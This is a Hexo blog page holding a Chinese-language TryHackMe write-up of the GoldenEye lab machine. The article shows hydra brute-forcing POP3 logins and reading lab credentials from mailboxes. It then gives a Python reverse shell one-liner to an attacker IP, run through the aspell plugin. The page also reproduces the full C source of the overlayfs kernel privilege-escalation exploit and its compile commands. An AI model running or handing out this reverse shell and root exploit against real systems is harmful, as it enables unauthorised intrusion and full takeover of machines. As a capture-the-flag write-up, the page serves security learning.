@@ -1,0 +1,239 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>GoldenEye pop3 hydra aspell overlayfs-3.13.0-32-generic | MoonlitSyntax</title><meta name="author" content="dionysus"><meta name="copyright" content="dionysus"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="hydra -l boris -P &#x2F;path&#x2F;dict pop3:&#x2F;&#x2F;10.10.208.133:55007 得到secret1! USER natalyaPASS birdRETR 1 两封邮件的内容 RETR 1+OK 631 octetsReturn-Path: &lt;root@ubuntu&gt;X-Original-To: natalyaDelivered-To: natalya@u">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GoldenEye pop3 hydra aspell overlayfs-3.13.0-32-generic">
+<meta property="og:url" content="https://blog.siren.blue/2024/06/07/try-hack-me/%E9%80%86%E5%A4%A9/GoldenEye%20pop3%20hydra%20aspell%20overlayfs-3.13.0-32-generic/index.html">
+<meta property="og:site_name" content="MoonlitSyntax">
+<meta property="og:description" content="hydra -l boris -P &#x2F;path&#x2F;dict pop3:&#x2F;&#x2F;10.10.208.133:55007 得到secret1! USER natalyaPASS birdRETR 1 两封邮件的内容 RETR 1+OK 631 octetsReturn-Path: &lt;root@ubuntu&gt;X-Original-To: natalyaDelivered-To: natalya@u">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.siren.blue/img/13.jpg">
+<meta property="article:published_time" content="2024-06-07T12:13:33.000Z">
+<meta property="article:modified_time" content="2024-06-08T03:29:59.384Z">
+<meta property="article:author" content="dionysus">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.siren.blue/img/13.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://blog.siren.blue/2024/06/07/try-hack-me/%E9%80%86%E5%A4%A9/GoldenEye%20pop3%20hydra%20aspell%20overlayfs-3.13.0-32-generic/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: {"appId":"GNDO5PR146","apiKey":"1423d4e114f7a03240e8700efd01af02","indexName":"moonlit","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: true,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'GoldenEye pop3 hydra aspell overlayfs-3.13.0-32-generic',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2024-06-08 11:29:59'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="//at.alicdn.com/t/c/font_4186045_vjy9vudusnm.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/l-lin/font-awesome-animation/dist/font-awesome-animation.min.css"  media="defer" onload="this.media='all'"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/18.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">303</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">12</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-zhuye"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-archiver"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw iconfont icon-fenlei"></i><span> 种类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw iconfont icon-yinle"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw iconfont icon-shipin"></i><span> Movie</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw iconfont icon-Book"></i><span> Book</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-lianjie"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-guanyuwomen"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/13.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="MoonlitSyntax"><span class="site-name">MoonlitSyntax</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-zhuye"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-archiver"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw iconfont icon-fenlei"></i><span> 种类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw iconfont icon-yinle"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw iconfont icon-shipin"></i><span> Movie</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw iconfont icon-Book"></i><span> Book</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-lianjie"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-guanyuwomen"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">GoldenEye pop3 hydra aspell overlayfs-3.13.0-32-generic</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-06-07T12:13:33.000Z" title="发表于 2024-06-07 20:13:33">2024-06-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-06-08T03:29:59.384Z" title="更新于 2024-06-08 11:29:59">2024-06-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/TryHackMe/">TryHackMe</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>8分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><code>hydra -l boris -P /path/dict pop3://10.10.208.133:55007</code><br>
+得到secret1!</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">USER natalya</span><br><span class="line">PASS bird</span><br><span class="line"></span><br><span class="line">RETR 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>两封邮件的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RETR 1</span><br><span class="line">+OK 631 octets</span><br><span class="line">Return-Path: &lt;root@ubuntu&gt;</span><br><span class="line">X-Original-To: natalya</span><br><span class="line">Delivered-To: natalya@ubuntu</span><br><span class="line">Received: from ok (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with ESMTP id D5EDA454B1</span><br><span class="line">        for &lt;natalya&gt;; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425024542.D5EDA454B1@ubuntu&gt;</span><br><span class="line">Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)</span><br><span class="line">From: root@ubuntu</span><br><span class="line"></span><br><span class="line">Natalya, please you need to stop breaking boris&#x27; codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.</span><br><span class="line"></span><br><span class="line">Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RETR 2</span><br><span class="line">+OK 1048 octets</span><br><span class="line">Return-Path: &lt;root@ubuntu&gt;</span><br><span class="line">X-Original-To: natalya</span><br><span class="line">Delivered-To: natalya@ubuntu</span><br><span class="line">Received: from root (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with SMTP id 17C96454B1</span><br><span class="line">        for &lt;natalya&gt;; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425031956.17C96454B1@ubuntu&gt;</span><br><span class="line">Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)</span><br><span class="line">From: root@ubuntu</span><br><span class="line"></span><br><span class="line">Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it&#x27;s related to security...even if it&#x27;s not, just enter it in under the guise of &quot;security&quot;...it&#x27;ll get the change order escalated without much hassle :)</span><br><span class="line"></span><br><span class="line">Ok, user creds are:</span><br><span class="line"></span><br><span class="line">username: xenia</span><br><span class="line">password: RCP90rulez!</span><br><span class="line"></span><br><span class="line">Boris verified her as a valid contractor so just create the account ok?</span><br><span class="line"></span><br><span class="line">And if you didn&#x27;t have the URL on outr internal Domain: severnaya-station.com/gnocertdir</span><br><span class="line">**Make sure to edit your host file since you usually work remote off-network....</span><br><span class="line"></span><br><span class="line">Since you&#x27;re a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>按照第二封邮件应该是要访问那个网站的,但是我这里有点问题,直接wp跳过一下</p>
+<p>有个doak用户,密码爆破是goat<br>
+登录试试看</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">retr 1</span><br><span class="line">+OK 606 octets</span><br><span class="line">Return-Path: &lt;doak@ubuntu&gt;</span><br><span class="line">X-Original-To: doak</span><br><span class="line">Delivered-To: doak@ubuntu</span><br><span class="line">Received: from doak (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with SMTP id 97DC24549D</span><br><span class="line">        for &lt;doak&gt;; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425034731.97DC24549D@ubuntu&gt;</span><br><span class="line">Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)</span><br><span class="line">From: doak@ubuntu</span><br><span class="line"></span><br><span class="line">James,</span><br><span class="line">If you&#x27;re reading this, congrats you&#x27;ve gotten this far. You know how tradecraft works right?</span><br><span class="line"></span><br><span class="line">Because I don&#x27;t. Go to our training site and login to my account....dig until you can exfiltrate further information......</span><br><span class="line"></span><br><span class="line">username: dr_doak</span><br><span class="line">password: 4England!</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>登录这个用户</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat s3cret.txt </span><br><span class="line">007,</span><br><span class="line"></span><br><span class="line">I was able to capture this apps adm1n cr3ds through clear txt. </span><br><span class="line"></span><br><span class="line">Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. </span><br><span class="line"></span><br><span class="line">Something juicy is located here: /dir007key/for-007.jpg</span><br><span class="line"></span><br><span class="line">Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.</span><br></pre></td></tr></table></figure>
+<p>admin的密码藏在图片数据里</p>
+<p>登录网页后<br>
+<img src="/z-img/Pasted%20image%2020240401085955.png" alt="Pasted%20image%2020240401085955"></p>
+<p>aspell插件直接反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.17.6.173&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>
+<p>spell 的engine要改成PSpellShell</p>
+<p>接下来是个nday</p>
+<ul>
+<li>使用 <code>clone</code> with <code>CLONE_NEWUSER|CLONE_NEWNS</code> 标志创建新用户并挂载命名空间</li>
+<li>挂载 overlayfs 使用 /bin 下层文件系统，一些临时目录作为上层目录和工作目录。</li>
+<li>在不更改所有者的情况下使 su overlayfs 世界可写</li>
+<li>让用户命名空间外部的进程将任意内容写入文件，应用稍作修改的 <code>SetgidDirectoryPrivilegeEscalation</code>漏洞利用变体。</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/37292">url</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sched.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/mount.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sched.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/mount.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;linux/sched.h&gt;</span><br><span class="line"></span><br><span class="line">#define LIB &quot;#include &lt;unistd.h&gt;\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n&#123;\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \&quot;getuid\&quot;);\nreadlink(\&quot;/proc/self/exe\&quot;, (char *) &amp;path, 128);\nif(geteuid() == 0 &amp;&amp; !strcmp(path, \&quot;/bin/su\&quot;)) &#123;\nunlink(\&quot;/etc/ld.so.preload\&quot;);unlink(\&quot;/tmp/ofs-lib.so\&quot;);\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\&quot;/bin/sh\&quot;, \&quot;sh\&quot;, \&quot;-i\&quot;, NULL, NULL);\n&#125;\n    return _real_getuid();\n&#125;\n&quot;</span><br><span class="line"></span><br><span class="line">static char child_stack[1024*1024];</span><br><span class="line"></span><br><span class="line">static int</span><br><span class="line">child_exec(void *stuff)</span><br><span class="line">&#123;</span><br><span class="line">    char *file;</span><br><span class="line">    system(&quot;rm -rf /tmp/ns_sploit&quot;);</span><br><span class="line">    mkdir(&quot;/tmp/ns_sploit&quot;, 0777);</span><br><span class="line">    mkdir(&quot;/tmp/ns_sploit/work&quot;, 0777);</span><br><span class="line">    mkdir(&quot;/tmp/ns_sploit/upper&quot;,0777);</span><br><span class="line">    mkdir(&quot;/tmp/ns_sploit/o&quot;,0777);</span><br><span class="line"></span><br><span class="line">    fprintf(stderr,&quot;mount #1\n&quot;);</span><br><span class="line">    if (mount(&quot;overlay&quot;, &quot;/tmp/ns_sploit/o&quot;, &quot;overlayfs&quot;, MS_MGC_VAL, &quot;lowerdir=/proc/sys/kernel,upperdir=/tmp/ns_sploit/upper&quot;) != 0) &#123;</span><br><span class="line">// workdir= and &quot;overlay&quot; is needed on newer kernels, also can&#x27;t use /proc as lower</span><br><span class="line">        if (mount(&quot;overlay&quot;, &quot;/tmp/ns_sploit/o&quot;, &quot;overlay&quot;, MS_MGC_VAL, &quot;lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work&quot;) != 0) &#123;</span><br><span class="line">            fprintf(stderr, &quot;no FS_USERNS_MOUNT for overlayfs on this kernel\n&quot;);</span><br><span class="line">            exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        file = &quot;.access&quot;;</span><br><span class="line">        chmod(&quot;/tmp/ns_sploit/work/work&quot;,0777);</span><br><span class="line">    &#125; else file = &quot;ns_last_pid&quot;;</span><br><span class="line"></span><br><span class="line">    chdir(&quot;/tmp/ns_sploit/o&quot;);</span><br><span class="line">    rename(file,&quot;ld.so.preload&quot;);</span><br><span class="line"></span><br><span class="line">    chdir(&quot;/&quot;);</span><br><span class="line">    umount(&quot;/tmp/ns_sploit/o&quot;);</span><br><span class="line">    fprintf(stderr,&quot;mount #2\n&quot;);</span><br><span class="line">    if (mount(&quot;overlay&quot;, &quot;/tmp/ns_sploit/o&quot;, &quot;overlayfs&quot;, MS_MGC_VAL, &quot;lowerdir=/tmp/ns_sploit/upper,upperdir=/etc&quot;) != 0) &#123;</span><br><span class="line">        if (mount(&quot;overlay&quot;, &quot;/tmp/ns_sploit/o&quot;, &quot;overlay&quot;, MS_MGC_VAL, &quot;lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work&quot;) != 0) &#123;</span><br><span class="line">            exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        chmod(&quot;/tmp/ns_sploit/work/work&quot;,0777);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    chmod(&quot;/tmp/ns_sploit/o/ld.so.preload&quot;,0777);</span><br><span class="line">    umount(&quot;/tmp/ns_sploit/o&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int</span><br><span class="line">main(int argc, char **argv)</span><br><span class="line">&#123;</span><br><span class="line">    int status, fd, lib;</span><br><span class="line">    pid_t wrapper, init;</span><br><span class="line">    int clone_flags = CLONE_NEWNS | SIGCHLD;</span><br><span class="line"></span><br><span class="line">    fprintf(stderr,&quot;spawning threads\n&quot;);</span><br><span class="line"></span><br><span class="line">    if((wrapper = fork()) == 0) &#123;</span><br><span class="line">        if(unshare(CLONE_NEWUSER) != 0)</span><br><span class="line">            fprintf(stderr, &quot;failed to create new user namespace\n&quot;);</span><br><span class="line"></span><br><span class="line">        if((init = fork()) == 0) &#123;</span><br><span class="line">            pid_t pid =</span><br><span class="line">                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);</span><br><span class="line">            if(pid &lt; 0) &#123;</span><br><span class="line">                fprintf(stderr, &quot;failed to create new mount namespace\n&quot;);</span><br><span class="line">                exit(-1);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            waitpid(pid, &amp;status, 0);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        waitpid(init, &amp;status, 0);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    usleep(300000);</span><br><span class="line"></span><br><span class="line">    wait(NULL);</span><br><span class="line"></span><br><span class="line">    fprintf(stderr,&quot;child threads done\n&quot;);</span><br><span class="line"></span><br><span class="line">    fd = open(&quot;/etc/ld.so.preload&quot;,O_WRONLY);</span><br><span class="line"></span><br><span class="line">    if(fd == -1) &#123;</span><br><span class="line">        fprintf(stderr,&quot;exploit failed\n&quot;);</span><br><span class="line">        exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fprintf(stderr,&quot;/etc/ld.so.preload created\n&quot;);</span><br><span class="line">    fprintf(stderr,&quot;creating shared library\n&quot;);</span><br><span class="line">    lib = open(&quot;/tmp/ofs-lib.c&quot;,O_CREAT|O_WRONLY,0777);</span><br><span class="line">    write(lib,LIB,strlen(LIB));</span><br><span class="line">    close(lib);</span><br><span class="line">    lib = system(&quot;gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w&quot;);</span><br><span class="line">    if(lib != 0) &#123;</span><br><span class="line">        fprintf(stderr,&quot;couldn&#x27;t create dynamic library\n&quot;);</span><br><span class="line">        exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line">    write(fd,&quot;/tmp/ofs-lib.so\n&quot;,16);</span><br><span class="line">    close(fd);</span><br><span class="line">    system(&quot;rm -rf /tmp/ns_sploit /tmp/ofs-lib.c&quot;);</span><br><span class="line">    execl(&quot;/bin/su&quot;,&quot;su&quot;,NULL);</span><br><span class="line">&#125;</span><br><span class="line">            </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><code>sed -i &quot;s/gcc/cc/g&quot; 37292.c</code>有cc无gcc.把gcc换成cc再编译</p>
+<p><code>cc 37292.c -o exploit</code></p>
+</article><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/13.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/06/07/try-hack-me/%E9%80%86%E5%A4%A9/Fowsniff%20CTF%20msf%20pop3/" title="Fowsniff CTF msf pop3"><img class="cover" src="/img/18.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Fowsniff CTF msf pop3</div></div></a></div><div class="next-post pull-right"><a href="/2024/06/07/try-hack-me/%E9%80%86%E5%A4%A9/HA%20Joker%20CTF/" title="HA Joker CTF"><img class="cover" src="/img/13.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">HA Joker CTF</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/18.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">dionysus</div><div class="author-info__description">我醉欲眠卿且去</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">303</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">12</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/MoonlitSyntax"><i class="fab fa-github"></i><span>此心安处</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="/img/wechat.png" target="_blank" title="微信"><i class="iconfont  icon-weixin"></i></a><a class="social-icon" href="https://res.abeim.cn/api/qq/?qq=1475856026" target="_blank" title="QQ"><i class="iconfont icon-QQ"></i></a><a class="social-icon" href="https://space.bilibili.com/430091327?spm_id_from=333.1007.0.0" target="_blank" title="bilibili"><i class="iconfont icon-bilibili"></i></a><a class="social-icon" href="mailto:1475856026@qq.com" target="_blank" title="QQ邮箱"><i class="iconfont icon-youxiang"></i></a><a class="social-icon" href="https://chat.openai.com" target="_blank" title="chatgpt"><i class="iconfont icon-ai"></i></a><a class="social-icon" href="https://www.luogu.com.cn" target="_blank" title="洛谷"><i class="iconfont icon-code"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><a class="faa-parent animated-hover"><svg class="faa-tada icon" style="height:25px;width:25px;fill:currentColor;position:relative;top:5px" aria-hidden="true"><use xlink:href="#icon-pinglun-1"></use></svg></a><span>公告</span></div><div class="announcement_content"><script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script> <div id="poem_sentence"></div> <div id="poem_info"></div> <script type="text/javascript">
+  jinrishici.load(function(result) {
+    var sentence = document.querySelector("#poem_sentence")
+    var info = document.querySelector("#poem_info")
+
+    var content = result.data.origin.content;
+
+    // 分割诗句为数组
+    var splitContent = [];
+    content.forEach(line => {
+        var phrases = line.split(/([。，])/);
+        for (var i = 0; i < phrases.length; i += 2) {
+            var phrase = phrases[i];
+            if (i + 1 < phrases.length) {
+                phrase += phrases[i + 1];
+            }
+            splitContent.push(phrase);
+        }
+    });
+
+    // 构建新的诗句
+    var newContent = "";
+    var line = "";
+    for (var i = 0; i < splitContent.length; i++) {
+        if (line.length + splitContent[i].length <= 15) {
+            line += splitContent[i];
+        } else {
+            newContent += line + '<br>';
+            line = splitContent[i];
+        }
+    }
+    newContent += line;
+
+    sentence.innerHTML = newContent;
+    info.innerHTML = '【' + result.data.origin.dynasty + '】' + result.data.origin.author + '《' + result.data.origin.title + '》';
+  });
+</script>
